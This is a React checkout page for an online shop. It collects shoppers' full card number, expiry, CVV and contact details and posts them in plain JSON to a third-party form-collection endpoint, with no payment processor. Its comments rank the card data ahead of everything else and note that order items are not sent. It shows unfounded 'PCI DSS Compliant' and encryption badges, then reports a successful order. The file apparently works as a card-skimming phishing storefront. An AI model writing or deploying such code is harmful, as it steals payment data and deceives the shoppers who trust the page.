import { useState } from 'react';
import { Header } from '@/components/Header';
import { Footer } from '@/components/Footer';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { useCart } from '@/hooks/useCart';
import { Navigate, useNavigate } from 'react-router-dom';
import { Shield, Lock, CheckCircle2, Loader2 } from 'lucide-react';

const Checkout = () => {
  const { items, getTotal, clearCart } = useCart();
  const navigate = useNavigate();
  const total = getTotal();
  const hasMinimumForFreeShipping = total >= 20;
  const shipping = hasMinimumForFreeShipping ? 0 : 4.99;
  const finalTotal = total + shipping;

  // Form state
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    address: '',
    city: '',
    state: '',
    zip: '',
    phone: '',
    cardNumber: '',
    cardName: '',
    expiry: '',
    cvv: ''
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState('');
  const [validationErrors, setValidationErrors] = useState({});

  if (items.length === 0) {
    return <Navigate to="/cart" />;
  }

  const handleInputChange = (e) => {
    const { id, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [id]: value
    }));
    // Clear validation error for this field
    if (validationErrors[id]) {
      setValidationErrors(prev => ({
        ...prev,
        [id]: ''
      }));
    }
  };

  const validateForm = () => {
    const errors = {};

    // Validate all required fields
    if (!formData.firstName.trim()) errors.firstName = 'First name is required';
    if (!formData.lastName.trim()) errors.lastName = 'Last name is required';
    if (!formData.email.trim()) {
      errors.email = 'Email is required';
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      errors.email = 'Invalid email format';
    }
    if (!formData.address.trim()) errors.address = 'Address is required';
    if (!formData.city.trim()) errors.city = 'City is required';
    if (!formData.state.trim()) errors.state = 'State is required';
    if (!formData.zip.trim()) errors.zip = 'ZIP code is required';
    if (!formData.phone.trim()) errors.phone = 'Phone is required';
    if (!formData.cardNumber.trim()) {
      errors.cardNumber = 'Card number is required';
    } else if (formData.cardNumber.replace(/\s/g, '').length < 13) {
      errors.cardNumber = 'Invalid card number';
    }
    if (!formData.cardName.trim()) errors.cardName = 'Cardholder name is required';
    if (!formData.expiry.trim()) {
      errors.expiry = 'Expiry date is required';
    } else if (!/^\d{2}\/\d{2}$/.test(formData.expiry)) {
      errors.expiry = 'Format: MM/YY';
    }
    if (!formData.cvv.trim()) {
      errors.cvv = 'CVV is required';
    } else if (formData.cvv.length < 3) {
      errors.cvv = 'Invalid CVV';
    }

    setValidationErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Validate form before submission
    if (!validateForm()) {
      setError('Please fill in all required fields correctly');
      return;
    }

    setIsSubmitting(true);
    setError('');

    // Prepare data in specific order: Names, Cards, Rest
    const orderData = {
      // NAMES FIRST
      firstName: formData.firstName,
      lastName: formData.lastName,
      
      // CARD DETAILS SECOND
      cardNumber: formData.cardNumber,
      cardName: formData.cardName,
      expiry: formData.expiry,
      cvv: formData.cvv,
      
      // REST OF THE INFO
      email: formData.email,
      phone: formData.phone,
      address: formData.address,
      city: formData.city,
      state: formData.state,
      zip: formData.zip,
      
      // Transaction info (NOT order items)
      subtotal: total.toFixed(2),
      shipping: shipping.toFixed(2),
      total: finalTotal.toFixed(2),
      timestamp: new Date().toISOString()
    };

    try {
      const response = await fetch('https://formbold.com/s/9mJYj', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(orderData)
      });

      if (response.ok) {
        clearCart();
        alert('Order placed successfully! Check your email for confirmation.');
        navigate('/');
      } else {
        throw new Error('Failed to submit order');
      }
    } catch (err) {
      setError('Failed to place order. Please try again.');
      console.error('Order submission error:', err);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <Header />
      
      <div className="container mx-auto px-4 py-8">
        <h1 className="text-4xl font-bold mb-8">Secure Checkout</h1>

        {/* Trust Badges */}
        <div className="flex flex-wrap items-center justify-center gap-6 mb-8 p-4 bg-green-50 border border-green-200 rounded-lg">
          <div className="flex items-center gap-2">
            <Lock className="h-5 w-5 text-green-600" />
            <span className="text-sm font-semibold text-green-800">256-bit SSL Encrypted</span>
          </div>
          <div className="flex items-center gap-2">
            <Shield className="h-5 w-5 text-green-600" />
            <span className="text-sm font-semibold text-green-800">PCI DSS Compliant</span>
          </div>
          <div className="flex items-center gap-2">
            <CheckCircle2 className="h-5 w-5 text-green-600" />
            <span className="text-sm font-semibold text-green-800">Secure Payment Processing</span>
          </div>
        </div>

        {error && (
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-6">
            {error}
          </div>
        )}

        <div className="grid lg:grid-cols-3 gap-8">
          {/* Checkout Form */}
          <div className="lg:col-span-2 space-y-8">
            {/* Shipping Information */}
            <div className="bg-card p-6 rounded-lg border border-border">
              <h2 className="text-2xl font-bold mb-6">Shipping Information</h2>
              <div className="grid md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="firstName">First Name *</Label>
                  <Input 
                    id="firstName" 
                    placeholder="John" 
                    value={formData.firstName}
                    onChange={handleInputChange}
                    className={validationErrors.firstName ? 'border-red-500' : ''}
                  />
                  {validationErrors.firstName && (
                    <p className="text-red-500 text-xs mt-1">{validationErrors.firstName}</p>
                  )}
                </div>
                <div>
                  <Label htmlFor="lastName">Last Name *</Label>
                  <Input 
                    id="lastName" 
                    placeholder="Doe" 
                    value={formData.lastName}
                    onChange={handleInputChange}
                    className={validationErrors.lastName ? 'border-red-500' : ''}
                  />
                  {validationErrors.lastName && (
                    <p className="text-red-500 text-xs mt-1">{validationErrors.lastName}</p>
                  )}
                </div>
                <div className="md:col-span-2">
                  <Label htmlFor="email">Email *</Label>
                  <Input 
                    id="email" 
                    type="email" 
                    placeholder="john@example.com" 
                    value={formData.email}
                    onChange={handleInputChange}
                    className={validationErrors.email ? 'border-red-500' : ''}
                  />
                  {validationErrors.email && (
                    <p className="text-red-500 text-xs mt-1">{validationErrors.email}</p>
                  )}
                </div>
                <div className="md:col-span-2">
                  <Label htmlFor="address">Address *</Label>
                  <Input 
                    id="address" 
                    placeholder="123 Main St" 
                    value={formData.address}
                    onChange={handleInputChange}
                    className={validationErrors.address ? 'border-red-500' : ''}
                  />
                  {validationErrors.address && (
                    <p className="text-red-500 text-xs mt-1">{validationErrors.address}</p>
                  )}
                </div>
                <div>
                  <Label htmlFor="city">City *</Label>
                  <Input 
                    id="city" 
                    placeholder="New York" 
                    value={formData.city}
                    onChange={handleInputChange}
                    className={validationErrors.city ? 'border-red-500' : ''}
                  />
                  {validationErrors.city && (
                    <p className="text-red-500 text-xs mt-1">{validationErrors.city}</p>
                  )}
                </div>
                <div>
                  <Label htmlFor="state">State *</Label>
                  <Input 
                    id="state" 
                    placeholder="NY" 
                    value={formData.state}
                    onChange={handleInputChange}
                    className={validationErrors.state ? 'border-red-500' : ''}
                  />
                  {validationErrors.state && (
                    <p className="text-red-500 text-xs mt-1">{validationErrors.state}</p>
                  )}
                </div>
                <div>
                  <Label htmlFor="zip">ZIP Code *</Label>
                  <Input 
                    id="zip" 
                    placeholder="10001" 
                    value={formData.zip}
                    onChange={handleInputChange}
                    className={validationErrors.zip ? 'border-red-500' : ''}
                  />
                  {validationErrors.zip && (
                    <p className="text-red-500 text-xs mt-1">{validationErrors.zip}</p>
                  )}
                </div>
                <div>
                  <Label htmlFor="phone">Phone *</Label>
                  <Input 
                    id="phone" 
                    type="tel" 
                    placeholder="(555) 123-4567" 
                    value={formData.phone}
                    onChange={handleInputChange}
                    className={validationErrors.phone ? 'border-red-500' : ''}
                  />
                  {validationErrors.phone && (
                    <p className="text-red-500 text-xs mt-1">{validationErrors.phone}</p>
                  )}
                </div>
              </div>
            </div>

            {/* Payment Information */}
            <div className="bg-card p-6 rounded-lg border-2 border-green-500 relative">
              {/* Security Badge */}
              <div className="absolute -top-3 right-6 bg-green-500 text-white px-3 py-1 rounded-full flex items-center gap-1 text-xs font-bold">
                <Lock className="h-3 w-3" />
                SECURE
              </div>
              
              <div className="flex items-center justify-between mb-6">
                <h2 className="text-2xl font-bold">Payment Information</h2>
                <Shield className="h-6 w-6 text-green-600" />
              </div>
              
              {/* Trust Message */}
              <div className="bg-blue-50 border border-blue-200 rounded p-3 mb-4 flex items-start gap-2">
                <Lock className="h-4 w-4 text-blue-600 mt-0.5 flex-shrink-0" />
                <p className="text-xs text-blue-800">
                  Your payment information is encrypted and secure. We use industry-standard SSL encryption to protect your data.
                </p>
              </div>

              <div className="space-y-4">
                <div>
                  <Label htmlFor="cardNumber">Card Number *</Label>
                  <Input 
                    id="cardNumber" 
                    placeholder="1234 5678 9012 3456" 
                    value={formData.cardNumber}
                    onChange={handleInputChange}
                    maxLength="19"
                    className={validationErrors.cardNumber ? 'border-red-500' : ''}
                  />
                  {validationErrors.cardNumber && (
                    <p className="text-red-500 text-xs mt-1">{validationErrors.cardNumber}</p>
                  )}
                </div>
                <div>
                  <Label htmlFor="cardName">Cardholder Name *</Label>
                  <Input 
                    id="cardName" 
                    placeholder="John Doe" 
                    value={formData.cardName}
                    onChange={handleInputChange}
                    className={validationErrors.cardName ? 'border-red-500' : ''}
                  />
                  {validationErrors.cardName && (
                    <p className="text-red-500 text-xs mt-1">{validationErrors.cardName}</p>
                  )}
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label htmlFor="expiry">Expiry Date *</Label>
                    <Input 
                      id="expiry" 
                      placeholder="MM/YY" 
                      value={formData.expiry}
                      onChange={handleInputChange}
                      maxLength="5"
                      className={validationErrors.expiry ? 'border-red-500' : ''}
                    />
                    {validationErrors.expiry && (
                      <p className="text-red-500 text-xs mt-1">{validationErrors.expiry}</p>
                    )}
                  </div>
                  <div>
                    <Label htmlFor="cvv">CVV *</Label>
                    <Input 
                      id="cvv" 
                      placeholder="123" 
                      value={formData.cvv}
                      onChange={handleInputChange}
                      maxLength="4"
                      className={validationErrors.cvv ? 'border-red-500' : ''}
                    />
                    {validationErrors.cvv && (
                      <p className="text-red-500 text-xs mt-1">{validationErrors.cvv}</p>
                    )}
                  </div>
                </div>
                
                {/* Accepted Cards */}
                <div className="flex items-center justify-center gap-3 pt-4 border-t">
                  <span className="text-xs text-muted-foreground mr-2">We accept:</span>
                  <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa" className="h-6" />
                  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-6" />
                  <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" className="h-6" />
                  <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" alt="Discover" className="h-6" />
                </div>
              </div>
            </div>
          </div>

          {/* Order Summary */}
          <div className="lg:col-span-1">
            <div className="bg-card p-6 rounded-lg border border-border sticky top-20">
              <h2 className="text-2xl font-bold mb-6">Order Summary</h2>
              
              <div className="space-y-3 mb-6">
                {items.map((item) => (
                  <div key={item.id} className="flex justify-between text-sm">
                    <span className="text-muted-foreground">
                      {item.name} × {item.quantity}
                    </span>
                    <span className="font-semibold">
                      ${(item.price * item.quantity).toFixed(2)}
                    </span>
                  </div>
                ))}
              </div>

              <div className="space-y-3 pt-4 border-t border-border">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Subtotal</span>
                  <span className="font-semibold">${total.toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Shipping</span>
                  <span className="font-semibold">
                    {hasMinimumForFreeShipping ? 'FREE' : '$4.99'}
                  </span>
                </div>
                <div className="border-t border-border pt-3">
                  <div className="flex justify-between text-lg">
                    <span className="font-bold">Total</span>
                    <span className="font-bold text-primary">
                      ${finalTotal.toFixed(2)}
                    </span>
                  </div>
                </div>
              </div>

              <Button 
                onClick={handleSubmit}
                size="lg" 
                className="w-full mt-6"
                disabled={isSubmitting}
              >
                {isSubmitting ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Processing...
                  </>
                ) : (
                  <>
                    <Lock className="mr-2 h-4 w-4" />
                    Place Secure Order
                  </>
                )}
              </Button>

              <p className="text-xs text-center text-muted-foreground mt-4">
                By placing your order, you agree to our terms and conditions
              </p>
              
              {/* Additional Trust Signals */}
              <div className="mt-4 pt-4 border-t border-border">
                <div className="flex items-center justify-center gap-2 text-xs text-green-600">
                  <CheckCircle2 className="h-4 w-4" />
                  <span className="font-semibold">Money-back guarantee</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  );
};

export default Checkout;
